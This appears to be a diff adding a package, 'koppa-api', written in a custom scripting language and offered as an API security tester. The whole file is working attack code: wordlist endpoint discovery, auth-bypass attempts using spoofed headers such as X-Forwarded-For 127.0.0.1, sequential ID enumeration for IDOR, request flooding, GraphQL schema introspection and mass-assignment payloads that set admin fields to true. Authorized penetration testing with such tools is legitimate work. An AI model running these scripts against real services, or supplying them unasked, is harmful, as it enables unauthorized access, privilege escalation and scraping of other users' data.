@@ -1,0 +1,117 @@
+## koppa package: koppa-api
+## version: 1.0.0
+## description: API security tester — endpoint discovery, auth bypass, IDOR, rate-limit, GraphQL
+## author: KOPPA-OS
+## tags: web, api, rest, graphql, idor
+
+import net, log, sys, crypt
+
+fn discover_endpoints(base_url, wordlist) {
+    log.info("[*] API endpoint discovery: " + base_url)
+    let paths  = sys.read_lines(wordlist or "/usr/share/wordlists/dirb/common.txt")
+    let prefixes = ["/api/", "/api/v1/", "/api/v2/", "/v1/", "/v2/", "/rest/", "/graphql"]
+    let found  = []
+    for prefix in prefixes {
+        for path in paths {
+            let url  = base_url + prefix + path
+            let resp = net.http_get(url)
+            if resp.status in [200, 201, 204, 401, 403] {
+                log.ok("[" + resp.status.to_str() + "] " + url)
+                found.push({ url: url, status: resp.status })
+            }
+        }
+    }
+    return found
+}
+
+fn test_auth_bypass(url) {
+    log.info("[*] Auth bypass tests: " + url)
+    let headers_list = [
+        { "Authorization": "null" },
+        { "Authorization": "undefined" },
+        { "Authorization": "Bearer null" },
+        { "X-Original-URL": "/" },
+        { "X-Forwarded-For": "127.0.0.1" },
+        { "X-Custom-IP-Authorization": "127.0.0.1" },
+        { "X-Rewrite-URL": "/" }
+    ]
+    for hdrs in headers_list {
+        let resp = net.http_get(url, hdrs)
+        if resp.status == 200 {
+            log.ok("[+] Auth bypass! Headers: " + hdrs.to_str())
+        }
+    }
+}
+
+fn test_idor(base_url, endpoint, id_range) {
+    log.info("[*] IDOR test: " + base_url + endpoint)
+    let found = []
+    for id in sys.range(id_range[0], id_range[1]) {
+        let resp = net.http_get(base_url + endpoint + "/" + id.to_str())
+        if resp.status == 200 {
+            log.ok("[+] IDOR: id=" + id.to_str() + "  (" + resp.body.len().to_str() + " bytes)")
+            found.push(id)
+        }
+    }
+    return found
+}
+
+fn test_rate_limit(url, requests, token) {
+    log.info("[*] Rate limit test: " + requests.to_str() + " requests to " + url)
+    let blocked = false
+    for i in sys.range(0, requests) {
+        let hdrs = token != "" and { "Authorization": "Bearer " + token } or {}
+        let resp = net.http_get(url, hdrs)
+        if resp.status == 429 {
+            log.ok("[+] Rate limited at request #" + i.to_str())
+            blocked = true
+            break
+        }
+    }
+    if not blocked { log.warn("[!] No rate limiting detected after " + requests.to_str() + " requests") }
+}
+
+fn graphql_introspect(url) {
+    log.info("[*] GraphQL introspection: " + url)
+    let query = '{"query":"{__schema{types{name fields{name type{name}}}}}"}'
+    let resp  = net.http_post(url, query, { "Content-Type": "application/json" })
+    if resp.body.contains("__schema") {
+        log.ok("[+] Introspection enabled!")
+        log.muted(resp.body[:800])
+        return resp.body
+    }
+    log.muted("[-] Introspection disabled")
+    return ""
+}
+
+fn test_mass_assignment(url, method, fields) {
+    log.info("[*] Mass assignment test: " + url)
+    let evil = {}
+    for f in (fields or ["isAdmin", "role", "is_admin", "admin", "privileged", "verified"]) {
+        evil[f] = true
+    }
+    let resp = net.http_request(method or "PUT", url, evil.to_json(),
+                                { "Content-Type": "application/json" })
+    log.ok("[" + resp.status.to_str() + "] Response: " + resp.body[:200])
+}
+
+fn main(args) {
+    log.info("[koppa-api] API Security Tester v1.0")
+    let url  = args[0] or sys.prompt("Base URL: ")
+    let mode = args[1] or "discover"
+    if mode == "discover"  { discover_endpoints(url, args[2]) }
+    if mode == "auth"      { test_auth_bypass(url) }
+    if mode == "idor" {
+        let ep  = args[2] or sys.prompt("Endpoint (e.g. /users): ")
+        let r   = [args[3].to_int() or 1, args[4].to_int() or 100]
+        test_idor(url, ep, r)
+    }
+    if mode == "ratelimit" {
+        let n = args[2].to_int() or 200
+        test_rate_limit(url, n, args[3] or "")
+    }
+    if mode == "graphql"   { graphql_introspect(url) }
+    if mode == "massassign" {
+        test_mass_assignment(url, args[2], [])
+    }
+}
